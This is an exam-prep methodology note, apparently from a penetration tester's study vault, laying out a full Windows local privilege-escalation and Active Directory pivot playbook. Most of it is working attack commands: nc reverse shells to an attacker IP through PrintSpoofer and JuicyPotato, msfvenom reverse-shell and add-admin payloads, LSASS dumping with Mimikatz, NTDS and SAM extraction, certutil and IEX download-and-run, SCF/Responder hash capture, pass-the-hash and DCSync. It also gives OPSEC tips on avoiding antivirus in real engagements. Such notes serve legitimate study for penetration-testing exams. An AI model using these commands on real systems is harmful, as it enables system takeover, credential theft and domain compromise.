# NOTE — Windows Privilege Escalation Methodology (Exam Playbook)

## ID
712

## Module
Windows Privilege Escalation

## Kind
methodology

## Title
Windows Privilege Escalation — Full Local-to-SYSTEM Methodology

## Description
End-to-end exam-ready playbook for taking a low-priv Windows shell to NT AUTHORITY\SYSTEM / local admin, then pivoting that into the domain. Decision-tree first: token privileges → privileged groups → credential hunting → service/permission abuse → kernel/3rd-party exploits → user-coercion → restricted-env breakout. Commands drawn from this vault's own notes.

## Tags
methodology, windows, windows-privesc, privesc, exam, cheatsheet, decision-tree, seimpersonate, sedebugprivilege, setakeownership, sebackupprivilege, seloaddriver, potato, printspoofer, juicypotato, backup-operators, server-operators, dnsadmins, event-log-readers, print-operators, hyper-v, unquoted-service-path, weak-service-permissions, alwaysinstallelevated, uac-bypass, printnightmare, hivenightmare, kernel-exploit, ms16-032, citrix-breakout, unattend-xml, lazagne, mremoteng, credential-hunting, scf, responder

---

## TL;DR — The 7-Phase Flow

1. **Situational awareness + enumeration** — `whoami /priv`, `whoami /groups`, `systeminfo`, network, security controls (Defender/AppLocker).
2. **Token-privilege quick wins** — `whoami /priv` non-default rights: SeImpersonate, SeDebug, SeTakeOwnership, SeBackup, SeLoadDriver → near-instant SYSTEM.
3. **Privileged group abuse** — Backup/Server/Print Operators, DnsAdmins, Event Log Readers, Hyper-V Admins → SYSTEM / DC compromise.
4. **Credential hunting & pillaging** — files, registry, browsers, KeePass, LaZagne, PS history, mRemoteNG, backups → reuse / PtH.
5. **Service & permission abuse** — weak ACLs, modifiable binaries, unquoted paths, registry ACLs, vulnerable 3rd-party services.
6. **Kernel & OS exploits** — patch-gap enum → HiveNightmare, PrintNightmare, CVE-2020-0668, AlwaysInstallElevated, legacy MS exploits.
7. **User-coercion & breakout** — SCF/LNK + Responder, process monitoring, traffic capture; Citrix/restricted-desktop escape. Then **SYSTEM → AD** (dump SAM/LSASS/NTDS → pivot).

> **Golden rule:** run `whoami /priv` and `whoami /groups` FIRST, from an **elevated** prompt. A "Disabled" privilege still means you HAVE it — it's enablable. Most exam boxes fall to a single token privilege or one misconfigured service; don't reach for kernel exploits until enumeration is exhausted.

> **OPSEC fork:** automated tools (winPEAS/SharpUp/LaZagne) are flagged by 47/70+ AV engines and may end a monitored engagement. On the exam (no AV grading) run them freely for speed; in real engagements, fall back to manual `whoami` / `icacls` / `accesschk` / `findstr`. Adding a local user / kernel exploit that reboots = noisy + box-fragile → last resort.

---

## Phase 1 — Situational Awareness & Initial Enumeration

**You have:** a low-priv shell or RDP session.
**Goal:** know where you are, what you can run, what's watching.

| Check | Command |
|---|---|
| Your context | `echo %USERNAME%` / `whoami` |
| **Privileges (do FIRST, elevated)** | `whoami /priv` |
| **Group membership** | `whoami /groups`, `net localgroup`, `net localgroup <GROUP>` |
| OS / patch level / VM | `systeminfo`, `wmic qfe`, `Get-HotFix \| ft -AutoSize` |
| Processes / services | `tasklist /svc` |
| Env / PATH (writable = DLL hijack) | `set` |
| Installed software (3rd-party = weak) | `wmic product get name` |
| Listening ports (localhost = juicy) | `netstat -ano` |
| Logged-in users | `query user` |
| Network / dual-homed / pivot | `ipconfig /all`, `arp -a`, `route print` |
| Defender state | `Get-MpComputerStatus` |
| AppLocker rules | `Get-AppLockerPolicy -Effective \| select -ExpandProperty RuleCollections` |

> After this you have: a list of non-default token privileges, group memberships, OS build/patch gap, localhost-only services, and whether Defender/AppLocker will block tooling. **The privesc path usually picks itself from `whoami /priv` + `whoami /groups`.**

Detail: `[[03-situational-awareness]]`, `[[04-initial-enumeration]]`, `[[05-communication-with-processes]]`, `[[02-intro]]` (tools).

---

## Phase 2 — Token-Privilege Quick Wins (CHECK FIRST)

`whoami /priv` from an **elevated** prompt. Any of these = fast SYSTEM. (Disabled ≠ unusable — enable at token level.)

| Privilege | Trigger / Precondition | Attack | Detail |
|---|---|---|---|
| **SeImpersonate / SeAssignPrimaryToken** | Service acct (MSSQL, IIS, web app); `whoami /priv` shows it Enabled | PrintSpoofer (Win10/2019+) **or** JuicyPotato (≤2016) → SYSTEM | `[[07-seimpersonate]]` |
| **SeDebugPrivilege** | Dev/troubleshooting acct, elevated prompt | ProcDump LSASS → Mimikatz `sekurlsa::logonpasswords`; or parent-PID SYSTEM shell | `[[08-sedebugprivilege]]` |
| **SeTakeOwnershipPrivilege** | Elevated prompt | `takeown` + `icacls /grant` any file (SAM, web.config, .kdbx) | `[[09-setakeownershipprivilege]]` |
| **SeBackupPrivilege** | Backup Operators member, elevated | Read any file; diskshadow → NTDS.dit on DC | `[[10-backup-operators]]` |
| **SeLoadDriverPrivilege** | Print Operators member, elevated, **Win10 < 1803** | EoPLoadDriver + Capcom.sys → SYSTEM | `[[14-print-operators]]` |

### 2.A — SeImpersonate (most common)
```
# from MSSQL service acct
mssqlclient.py <USER>@<TARGET_IP> -windows-auth
enable_xp_cmdshell
xp_cmdshell whoami /priv                     # confirm SeImpersonate Enabled
# attacker: nc -lvnp 8443
# Win10/Server2019+:
xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe <ATTACKER_IP> 8443 -e cmd.exe"
# Server 2016 and earlier:
xp_cmdshell c:\tools\JuicyPotato.exe -l <PORT> -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe <ATTACKER_IP> 8443 -e cmd.exe" -t *
```

### 2.B — SeDebugPrivilege
```
procdump.exe -accepteula -ma lsass.exe lsass.dmp
mimikatz.exe
  log
  sekurlsa::minidump lsass.dmp
  sekurlsa::logonpasswords
# OR SYSTEM shell via parent token:
tasklist                                     # find winlogon.exe PID
powershell -ep bypass; Import-Module .\psgetsys.ps1
[MyProcess]::CreateProcessFromParent(<WINLOGON_PID>,"cmd.exe","")
```

### 2.C — SeTakeOwnership
```
Import-Module C:\Tools\Enable-Privilege.ps1; C:\Tools\EnableAllTokenPrivs.ps1
whoami /priv                                 # now Enabled
takeown /f 'C:\TakeOwn\flag.txt'
icacls 'C:\TakeOwn\flag.txt' /grant <USER>:F
cat 'C:\TakeOwn\flag.txt'
```

### 2.D — SeBackupPrivilege (read any file / NTDS on DC)
```
Import-Module C:\Tools\SeBackupPrivilegeUtils.dll
Import-Module C:\Tools\SeBackupPrivilegeCmdLets.dll
Set-SeBackupPrivilege; Get-SeBackupPrivilege
Copy-FileSeBackupPrivilege '<PROTECTED_FILE>' C:\Tools\out.txt
# On DC — diskshadow then grab NTDS:
diskshadow.exe                               # set context clientaccessible; begin backup; add volume C: alias x; create; expose %x% E:; end backup
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit   # or: robocopy /B E:\Windows\NTDS C:\Tools\ntds ntds.dit
reg save HKLM\SYSTEM C:\Tools\SYSTEM.SAV
secretsdump.py -ntds ntds.dit -system SYSTEM.SAV -hashes lmhash:nthash LOCAL   # on attack box
```

> After this you have: SYSTEM shell, or arbitrary file read, or full domain NTDS hashes. If none of these privileges present → Phase 3.

---

## Phase 3 — Privileged Group Abuse

`whoami /groups` / `net localgroup`. Each group below is a direct escalation; many require **sign out & RDP back in** for new membership tokens.

| Group | Trigger | Attack | Detail |
|---|---|---|---|
| **Backup Operators** | SeBackup/SeRestore | see Phase 2.D (NTDS / any file) | `[[10-backup-operators]]` |
| **Event Log Readers** | member; 4688 cmdline auditing on | `wevtutil qe Security /rd:true /f:text \| findstr /i "/user"` → creds in logged cmdlines | `[[11-event-log-readers]]` |
| **DnsAdmins** | member; can restart DNS (`sc sdshow DNS` RPWP) | malicious DLL via `dnscmd /serverlevelplugindll` → SYSTEM on DC | `[[12-dnsadmins]]` |
| **Hyper-V Administrators** | DCs virtualized | offline-mount DC `.vhdx` → NTDS; or pre-Mar-2020 vmms.exe hardlink → SYSTEM | `[[13-hyperv-admin]]` |
| **Print Operators** | SeLoadDriver, Win10<1803 | Capcom.sys driver load → SYSTEM | `[[14-print-operators]]` |
| **Server Operators** | SERVICE_ALL_ACCESS on services | `sc config <SVC> binPath=` → add self to Administrators → DC owned | `[[15-server-operators]]` |

```
# Event Log Readers — creds in command-line audit logs
wevtutil qe Security /rd:true /f:text | findstr /i "/user"

# DnsAdmins → SYSTEM on DC
msfvenom -p windows/x64/exec cmd='net group "domain admins" <USER> /add /domain' -f dll -o adduser.dll
dnscmd.exe /config /serverlevelplugindll C:\path\adduser.dll
sc.exe stop dns && sc.exe start dns
# sign out, RDP back in. CLEANUP: reg delete HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll /f ; sc start dns

# Server Operators → local admin on DC
sc qc AppReadiness                            # confirm LocalSystem
sc config AppReadiness binPath= "cmd /c net localgroup Administrators <USER> /add"
sc start AppReadiness                          # errors 1053 — command STILL ran
net localgroup Administrators                  # sign out + RDP back in
secretsdump.py <USER>@<DC_IP> -just-dc-user administrator   # from attack box once admin
```

> After this you have: SYSTEM / local admin / domain hashes. `binPath=` needs a **space after =**. Group changes need re-logon.

---

## Phase 4 — Credential Hunting & Pillaging

Always run after every shell AND again after getting admin (you'll see more files).

```
# Broad file search (CMD)
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
findstr /spin "password" *.*                  # filename + line + match
where /R C:\ *.config
dir /S /B *pass*.txt == *pass*.xml == *cred* == *vnc* == *.config*
Get-ChildItem C:\ -Recurse -Include *.rdp,*.config,*.vnc,*.cred -ErrorAction Ignore

# Classic locations
type C:\Windows\Panther\unattend.xml          # autologon creds (plaintext/base64)
type C:\inetpub\wwwroot\web.config
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"   # AutoAdminLogon / DefaultPassword
reg query HKCU\SOFTWARE\SimonTatham\PuTTY\Sessions                       # ProxyPassword

# PowerShell history (re-run after admin)
gc (Get-PSReadLineOption).HistorySavePath
foreach($u in (ls C:\users).fullname){cat "$u\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}

# DPAPI PS cred (must be same user)
$c=Import-Clixml 'C:\path\pass.xml'; $c.GetNetworkCredential().password

# Saved creds → reuse without password
cmdkey /list
runas /savecred /user:<DOM>\<USER> "cmd.exe /c whoami > C:\temp\w.txt"

# Tooled extraction
.\lazagne.exe all                              # broadest single sweep
.\SharpChrome.exe logins /unprotect            # Chrome (run as profile owner)
Import-Module .\SessionGopher.ps1; Invoke-SessionGopher -Target <HOST>   # PuTTY/WinSCP/RDP/FileZilla
netsh wlan show profile <SSID> key=clear       # Wi-Fi PSK

# KeePass found → crack offline
python2.7 keepass2john.py db.kdbx > h ; hashcat -m 13400 h rockyou.txt

# Sticky Notes
Invoke-SqliteQuery -Database '...\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite' -Query "SELECT Text FROM Note"
strings plum.sqlite-wal                        # -wal often has the real text

# mRemoteNG
cmd /c more "%USERPROFILE%\APPDATA\Roaming\mRemoteNG\confCons.xml"
python3 mremoteng_decrypt.py -s "<ENC_PW>"

# Backups → offline SAM dump (no admin on live host needed)
restic.exe -r <REPO> snapshots ; restic.exe -r <REPO> restore <ID> --target <DIR>
guestmount -a disk.vmdk -i --ro /mnt/vmdk      # or VHDX: --add x.vhdx --ro /mnt -m /dev/sda1
secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL

# User/computer description fields
Get-LocalUser | fl Name,Description
```

> After this you have: cleartext creds / NTLM hashes / a `.kdbx` / cookies → reuse against this or other hosts. Detail: `[[21-credential-hunting-notes]]`, `[[22-other-files-notes]]`, `[[23-further-credential-theft-notes]]`, `[[26-pillaging]]`, `[[27-miscellaneous-techniques]]`.

---

## Phase 5 — Service & Permission Abuse

Services run as SYSTEM → any service hijack = SYSTEM. Run `SharpUp.exe audit` (or `accesschk`) to triage.

| Technique | Trigger | Fix-action |
|---|---|---|
| **Modifiable service binary** | `icacls <exe>` shows `BUILTIN\Users:(F)` / `Everyone:(F)` | overwrite exe with msfvenom payload, `sc start` |
| **Weak service perms** | `accesschk -quvcw <SVC>` → SERVICE_ALL_ACCESS for Authenticated Users | `sc.exe config <SVC> binpath=` add-admin |
| **Unquoted service path** | path has space, no quotes, writable dir before exe | plant `C:\Program.exe` etc. |
| **Permissive registry ACL** | `accesschk -kvuqsw HKLM\System\CurrentControlSet\services` KEY_ALL_ACCESS | `Set-ItemProperty ...\<SVC> ImagePath` |
| **Vulnerable 3rd-party svc** | `wmic product get name` + `netstat` localhost port | known CVE/PoC (e.g. Druva inSync 6.6.3 RPC 127.0.0.1:6064) |

```
SharpUp.exe audit
icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f exe > SecurityService.exe
certutil.exe -f -urlcache http://<IP>:8080/SecurityService.exe SecurityService.exe
cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
nc -lvnp 4444 ; sc start SecurityService       # SYSTEM shell

# binpath swap
sc.exe config <SVC> binpath="cmd /c net localgroup administrators <USER> /add"
sc.exe stop <SVC> & sc.exe start <SVC>         # 1053 expected
# unquoted
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

> After this you have: SYSTEM (modifiable binary / 3rd-party RCE) or local admin (binpath swap). Detail: `[[17-weak-permissions]]`, `[[19-vulnerable-services]]`, `[[20-dll-injection]]`.

---

## Phase 6 — Kernel & OS-Level Exploits

Enumerate patch gap first: `wmic qfe list brief` / `Get-Hotfix` / `systeminfo`. Big gap = exploitable. Prefer stable, well-known exploits (box-fragile).

| Exploit | Trigger / Precondition | One-liner |
|---|---|---|
| **AlwaysInstallElevated** | both HKCU+HKLM `Installer\AlwaysInstallElevated = 0x1` | `msfvenom -p windows/shell_reverse_tcp ... -f msi > a.msi` → double-click / `msiexec /i a.msi /quiet /qn` → SYSTEM |
| **HiveNightmare** (CVE-2021-36934) | Win10; `icacls C:\Windows\System32\config\SAM` shows `Users:(RX)`; a VSS snapshot exists | `.\CVE-2021-36934.exe` → SAM/SYSTEM/SECURITY → `secretsdump local` |
| **PrintNightmare** (CVE-2021-1675/34527) | Spooler running (`ls \\localhost\pipe\spoolss`), unpatched | `Import-Module .\CVE-2021-1675.ps1; Invoke-Nightmare -NewUser h -NewPassword P -DriverName d` |
| **CVE-2020-0668** | Service Tracing flaw; need SYSTEM-startable svc to chain | arbitrary file move → overwrite MozillaMaintenance exe → `net start MozillaMaintenance` |
| **CVE-2019-1388** | GUI, unpatched pre-Nov-2019, hhupd.exe | UAC cert dialog → publisher hyperlink → browser as SYSTEM → save-as `cmd.exe` |
| **MS16-032** | Win7 SP1 / 2008/2012, **2+ CPU cores** | `Import-Module .\Invoke-MS16-032.ps1; Invoke-MS16-032` |
| **MS10-092 schelevator** | Server 2008 R2 | Metasploit `exploit/windows/local/ms10_092_schelevator` (migrate to x64 first) |

```
# AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
msfvenom -p windows/shell_reverse_tcp lhost=<IP> lport=9443 -f msi > aie.msi
nc -lvnp 9443 ; msiexec /i C:\path\aie.msi /quiet /qn /norestart

# HiveNightmare → PtH (no shell needed)
.\CVE-2021-36934.exe
secretsdump.py -sam SAM* -system SYSTEM* -security SECURITY* local
smbclient -U administrator '\\<IP>\C$' --pw-nt-hash      # paste NT hash as pw

# Legacy: Sherlock / Windows-Exploit-Suggester
Import-Module .\Sherlock.ps1; Find-AllVulns
python2.7 windows-exploit-suggester.py --database <date>-mssb.xls --systeminfo si.txt
```

> After this you have: SYSTEM shell or local-admin NTLM hashes. RCE CVEs (MS17-010 etc.) double as local privesc if you port-forward the blocked service back. Detail: `[[18-kernel-exploits]]`, `[[16-user-account-control]]` (UAC bypass DLL hijack), `[[27-miscellaneous-techniques]]`, `[[29-windows-server-privesc-notes]]`, `[[30-windows-desktop-versions-privesc-notes]]`, `[[28 — legacy-operating-systems]]`.

---

## Phase 7 — User-Coercion & Restricted-Environment Breakout

When local vectors are exhausted, exploit user behaviour or escape a locked-down desktop.

```
# SCF on a writable share → Responder captures NTLMv2 (Win ≤2016)
#   @Inventory.scf:  [Shell] Command=2  IconFile=\\<ATTACKER_IP>\share\x.ico  [Taskbar] Command=ToggleDesktop
sudo responder -wrf -v -I tun0
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
# Server 2019+: malicious .lnk with TargetPath=\\<ATTACKER_IP>\@pwn.png (WScript.Shell)

# Process-cmdline monitor (creds passed by scheduled tasks)
IEX (iwr 'http://<IP>/procmon.ps1')           # loop Compare-Object on Get-WmiObject Win32_Process CommandLine

# Citrix / restricted desktop breakout
#  Paint → File>Open dialog → UNC \\127.0.0.1\c$\users\<u>  (dialogs ignore GP folder policy)
#  → run pwn.exe (system("cmd")) from \\<smb>\share → PowerUp Write-UserAddMSI (AlwaysInstallElevated)
#  → runas /user:backdoor cmd → Bypass-UAC -Method UacMethodSysprep
```

> NTLMv2 (mode 5600) must be **cracked** — not PtH-able. SCF dead on 2019+ → use `.lnk`. Detail: `[[24-citrix-breakout]]`, `[[25-interacting-with-users]]`.

---

## Phase 8 — SYSTEM → Active Directory Pivot

Once SYSTEM/local-admin, harvest and move:
```
# Dump local hashes
secretsdump.py -sam SAM -system SYSTEM LOCAL                 # offline
mimikatz # privilege::debug ; sekurlsa::logonpasswords        # live LSASS
pwdump8.exe                                                   # from SYSTEM shell
# Local admin hash is often reused across the fleet (gold image) → PtH:
crackmapexec smb <SUBNET> --local-auth -u administrator -H <NT_HASH>
evil-winrm -i <IP> -u administrator -H <NT_HASH>
# On a DC → DCSync everything:
secretsdump.py -just-dc <DOMAIN>/<USER>@<DC_IP>
```
Chains into → `[[../ad-enum-attacks/00-METHODOLOGY]]` (Phase 6/7) and `[[../pivoting-tunneling/00-METHODOLOGY]]` if the host is dual-homed (check `ipconfig /all` from Phase 1).

---

## Decision Tree (Under Exam Pressure)

```
You have a low-priv Windows shell:
│
├── STEP 0 (always) → elevated prompt → whoami /priv ; whoami /groups ; systeminfo
│
├── whoami /priv has a non-default privilege
│   ├── SeImpersonate/SeAssignPrimaryToken → PrintSpoofer (2019+) / JuicyPotato (≤2016) → SYSTEM
│   ├── SeDebugPrivilege → ProcDump LSASS → Mimikatz  (or parent-PID SYSTEM shell)
│   ├── SeTakeOwnership → takeown + icacls /grant → read SAM/web.config/.kdbx
│   ├── SeBackupPrivilege → Copy-FileSeBackupPrivilege / diskshadow → NTDS on DC
│   └── SeLoadDriver (Win10<1803) → EoPLoadDriver Capcom.sys → SYSTEM
│
├── whoami /groups shows a privileged group
│   ├── Backup Operators → Phase 2.D
│   ├── Server Operators → sc config binPath add-admin
│   ├── DnsAdmins → dnscmd serverlevelplugindll DLL → SYSTEM(DC)
│   ├── Print Operators (Win10<1803) → Capcom
│   ├── Event Log Readers → wevtutil grep /user → creds
│   └── Hyper-V Admins → mount DC vhdx → NTDS
│
├── No privilege/group win → CREDENTIAL HUNT
│   ├── unattend.xml / web.config / Winlogon / PuTTY reg
│   ├── PS history + cmdkey/runas /savecred
│   ├── LaZagne all / SharpChrome / SessionGopher / KeePass
│   ├── Sticky Notes plum.sqlite / mRemoteNG confCons.xml
│   └── backups (restic / vhdx / vmdk) → offline secretsdump
│
├── Creds found → reuse: same host (runas/RDP) OR PtH across subnet OR DCSync if DC
│
├── Still stuck → SERVICE/PERMISSION ABUSE
│   ├── SharpUp audit → modifiable binary → overwrite exe → sc start = SYSTEM
│   ├── weak svc perms → sc config binpath add-admin
│   ├── unquoted path / registry ACL
│   └── wmic product → vulnerable 3rd-party svc (Druva etc.) localhost port
│
├── Still stuck → KERNEL / OS
│   ├── AlwaysInstallElevated (both keys 0x1) → msfvenom msi → SYSTEM
│   ├── HiveNightmare (SAM RX + VSS) → secretsdump → PtH
│   ├── PrintNightmare (spooler up) → new admin
│   ├── patch gap → Sherlock/WES-NG → MS16-032 / schelevator (legacy)
│   └── CVE-2020-0668 / UsoDllLoader (file-write + svc chain)
│
├── Restricted desktop (Citrix/kiosk) → dialog-box UNC breakout → AlwaysInstallElevated
│
├── User present, nothing else → SCF/LNK + Responder ; process-cmdline monitor
│
└── STUCK > 15 min
    ├── re-run whoami /priv from a TRULY elevated prompt (UAC hides privs)
    ├── grep ../ATTACK-PATHS.md for your exact state
    ├── re-run findstr + PS history (you may now see new files)
    ├── run winPEAS/Seatbelt for a second opinion
    └── check ipconfig /all — second NIC = pivot, not privesc (go to pivoting-tunneling)
```

---

## Signal → Counter-Move Reference

| You see / observe | Likely cause | Counter-move |
|---|---|---|
| `whoami /priv` shows few/no privileges | Not an elevated prompt — UAC filtered token | Re-open CMD/PS **as administrator** (supply creds); privs reappear |
| Privilege listed but **Disabled** | Not enabled at token level | It's still yours — `EnableAllTokenPrivs.ps1` / tool auto-enables it |
| JuicyPotato "fails silently", no shell | Server 2019 / Win10 1809+ | Switch to **PrintSpoofer** (or RoguePotato) immediately |
| `sc config ... binpath=` access denied | Not elevated, or missing space after `=` | Elevated prompt + `binPath= "cmd..."` (space after `=`) |
| `sc start <svc>` → error 1053 | Payload isn't a real service binary | **Expected** — the command/`net localgroup` still executed |
| Added to Administrators but still no access | Token doesn't have new group SID | **Sign out & RDP back in** (DnsAdmins/Server Operators) |
| `takeown` works but `cat` still denied | Forgot ACL step | `icacls <file> /grant <USER>:F` — ownership ≠ read |
| Mimikatz `sekurlsa::logonpasswords` blank | WDigest disabled (modern Win) | reg `UseLogonCredential=1` + relogin, or use the NT hash you have |
| `Copy-FileSeBackupPrivilege` not found | DLLs not imported | Import both `SeBackupPrivilegeUtils.dll` + `...CmdLets.dll` first |
| HiveNightmare exploit fails, ACL is wrong | No Volume Shadow Copy exists | Need ≥1 VSS snapshot; else pivot to another vector |
| PrintNightmare PoC errors | Spooler stopped / patched | `ls \\localhost\pipe\spoolss` — if absent, Spooler down |
| `Import-Clixml` cred decrypts to nothing | DPAPI bound to other user/machine | Must run as the user who created the XML |
| `runas /savecred` fails silently | No cached cred for that target | `cmdkey /list` first — only works if entry exists |
| `lazagne.exe all` returns little | Running as wrong user (DPAPI stores) | Re-run as target user / from admin/SYSTEM |
| schelevator / MSF local exploit fails | Session is x86 | `migrate` to a 64-bit PID first |
| MS16-032 does nothing | Single-core VM | Needs 2+ CPU cores — pick another exploit |
| `findstr` floods "Cannot open" | Locked system files | Ignore the errors, scan for real matches |
| Reverse shell never connects | Listener started after payload, or x86/x64 mismatch | Listener FIRST; match payload arch to binary (msi/dll arch) |
| Dialog box won't browse C:\ in Citrix | GP folder restriction on Explorer | Use UNC `\\127.0.0.1\c$\...` — dialogs bypass GP |

---

## Master Cheatsheet — One-Liners by Scenario

```bash
# === S1: First 30 seconds on the box ===
whoami /priv & whoami /groups & systeminfo & netstat -ano & ipconfig /all

# === S2: SeImpersonate → SYSTEM ===
PrintSpoofer.exe -c "c:\tools\nc.exe <ATTACKER_IP> 8443 -e cmd.exe"        # 2019+
JuicyPotato.exe -l 9999 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe <ATTACKER_IP> 8443 -e cmd.exe" -t *   # <=2016

# === S3: SeDebug → LSASS creds ===
procdump.exe -accepteula -ma lsass.exe l.dmp ; mimikatz "sekurlsa::minidump l.dmp" "sekurlsa::logonpasswords"

# === S4: SeBackup on DC → domain hashes ===
diskshadow /s script.txt ; robocopy /B E:\Windows\NTDS C:\T ntds.dit ; reg save HKLM\SYSTEM C:\T\SYS
secretsdump.py -ntds ntds.dit -system SYS LOCAL

# === S5: Server Operators → DC admin ===
sc config AppReadiness binPath= "cmd /c net localgroup Administrators <USER> /add" ; sc start AppReadiness

# === S6: DnsAdmins → SYSTEM on DC ===
msfvenom -p windows/x64/exec cmd='net group "domain admins" <U> /add /domain' -f dll -o a.dll
dnscmd /config /serverlevelplugindll C:\a.dll ; sc.exe stop dns ; sc.exe start dns

# === S7: Credential sweep ===
findstr /spin "password" *.* ; type C:\Windows\Panther\unattend.xml ; cmdkey /list ; lazagne.exe all
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# === S8: Weak service binary → SYSTEM ===
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f exe > svc.exe
copy /Y svc.exe "C:\Program Files (x86)\<App>\<svc>.exe" ; nc -lvnp 4444 ; sc start <SVC>

# === S9: AlwaysInstallElevated → SYSTEM ===
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
msfvenom -p windows/shell_reverse_tcp lhost=<IP> lport=9443 -f msi > a.msi ; msiexec /i a.msi /quiet /qn

# === S10: HiveNightmare → PtH (no shell) ===
.\CVE-2021-36934.exe ; secretsdump.py -sam SAM* -system SYSTEM* local
smbclient -U administrator '\\<IP>\C$' --pw-nt-hash

# === S11: Legacy patch-gap → SYSTEM ===
Import-Module .\Sherlock.ps1; Find-AllVulns ; Import-Module .\Invoke-MS16-032.ps1; Invoke-MS16-032

# === S12: SCF coercion → crack ===
# drop @x.scf (IconFile=\\<tun0>\share\i.ico) on share
sudo responder -wrf -v -I tun0 ; hashcat -m 5600 h.txt rockyou.txt

# === S13: SYSTEM → fleet PtH / DCSync ===
crackmapexec smb <SUBNET> --local-auth -u administrator -H <NT_HASH>
secretsdump.py -just-dc <DOMAIN>/<USER>@<DC_IP>
```

---

## Quick Reference — Tools by Function

| Function | Tools |
|---|---|
| Enumeration (auto) | winPEAS, Seatbelt, PowerUp/SharpUp, JAWS, WES-NG, Watson, Sherlock |
| Enumeration (manual) | `whoami /priv` `/groups`, `systeminfo`, `wmic qfe`, `net localgroup`, `netstat -ano`, `icacls`, `accesschk.exe`, `PsService.exe`, `pipelist.exe` |
| Token-priv exploit | PrintSpoofer, JuicyPotato, RoguePotato, GodPotato, ProcDump+Mimikatz, EoPLoadDriver+Capcom, `takeown`/`icacls`, SeBackupPrivilege DLLs, diskshadow/robocopy /B |
| Service abuse | `sc.exe config`, `accesschk -quvcw`, SharpUp, `wmic service` (unquoted) |
| Credential theft | LaZagne, SharpChrome, SessionGopher, mimikatz, `cmdkey`/`runas`, keepass2john, `findstr`, `reg query`, Import-Clixml, mremoteng_decrypt.py, PSSQLite |
| Kernel/OS | msfvenom (msi/dll/exe), HiveNightmare, CVE-2021-1675 PoC, CVE-2020-0668, Invoke-MS16-032, MSF `local_exploit_suggester`, WES-NG |
| Coercion | Responder, SCF/`.lnk`, procmon loop, Wireshark/net-creds |
| Breakout | Explorer++, pwn.exe (system("cmd")), PowerUp `Write-UserAddMSI`, Bypass-UAC, UACME |
| Hash use | `secretsdump.py`, pwdump8, `smbclient --pw-nt-hash`, evil-winrm `-H`, crackmapexec `--local-auth -H`, hashcat (-m 1000 NT, 5600 NTLMv2, 13400 KeePass) |
| File transfer (LOLBin) | `certutil -urlcache`, `curl`, `wget` (PS), SMB (`smbserver.py`), `bitsadmin` |

Hashcat modes: **1000** NT, **5600** NTLMv2, **13400** KeePass, **13100** Kerberoast TGS.

---

## Top Gotchas (Things That Will Burn You)

1. **`whoami /priv` from a non-elevated prompt lies.** UAC filters the token — privileges (SeImpersonate, SeLoadDriver, SeBackup) won't show. Always open CMD/PS **as administrator** (supply creds) before concluding "no privileges."
2. **"Disabled" ≠ unusable.** A disabled privilege is still assigned. Enable it (`EnableAllTokenPrivs.ps1`, or the exploit auto-enables) — don't skip the box because it says Disabled.
3. **JuicyPotato is dead on Server 2019 / Win10 1809+** and fails *silently*. If no shell in seconds → PrintSpoofer/RoguePotato.
4. **`binPath=` needs a space after the `=`.** `binPath= "cmd..."` works; `binPath="cmd..."` silently fails.
5. **`sc start` error 1053 is EXPECTED** when the binpath is a command, not a service exe — the `net localgroup` / payload already ran. Don't panic and retry.
6. **Group membership needs a new logon.** After DnsAdmins/Server Operators add you to Administrators/DA, **sign out & RDP back in** — current session token is stale.
7. **`takeown` alone gives nothing.** Ownership ≠ access. You MUST `icacls <file> /grant <USER>:F` after.
8. **SeBackup needs both DLLs imported** before `Set-SeBackupPrivilege` exists; and you need the **SYSTEM hive** alongside NTDS/SAM or secretsdump can't decrypt.
9. **HiveNightmare needs a Volume Shadow Copy** to exist — wrong ACLs alone aren't enough.
10. **DPAPI is user+machine bound.** `Import-Clixml`, SharpChrome, LaZagne DPAPI stores only decrypt as the owning user. Run as them / as SYSTEM.
11. **`runas /savecred` only works if `cmdkey /list` already has the entry** — it never prompts; it just fails quietly.
12. **msfvenom arch must match.** UAC-bypass DLL hijack of a 32-bit auto-elevating binary needs an **x86** payload; 64-bit service binary needs **x64**. Mismatch = no callback.
13. **MS16-032 needs ≥2 CPU cores; MSF local exploits need an x64 session** (`migrate` first). Single-core VM = pick another.
14. **Listener BEFORE payload, always.** Reverse shell that never connects = handler wasn't up.
15. **In PowerShell, `sc` is an alias for `Set-Content`.** Use `sc.exe` for service ops.
16. **Citrix/restricted desktop:** dialog boxes (File>Open/Save) **ignore** Group Policy folder restrictions; UNC `\\127.0.0.1\c$\...` bypasses Explorer policy. That's the breakout primitive.
17. **SCF auth-coercion is dead on Server 2019+** — use a malicious `.lnk` instead. NTLMv2 (5600) must be **cracked**, it is NOT Pass-the-Hash-able.
18. **Re-run credential hunting after every privilege gain** — `findstr` / PS history / SessionGopher show files you couldn't read before.
19. **`confidential.txt`-style files hide in `Music`/`Videos`/`Contacts`** — don't only check Desktop (Skills Assessment I).
20. **A second NIC (`ipconfig /all`) is a pivot, not a privesc** — stop escalating, go to `[[../pivoting-tunneling/00-METHODOLOGY]]`.
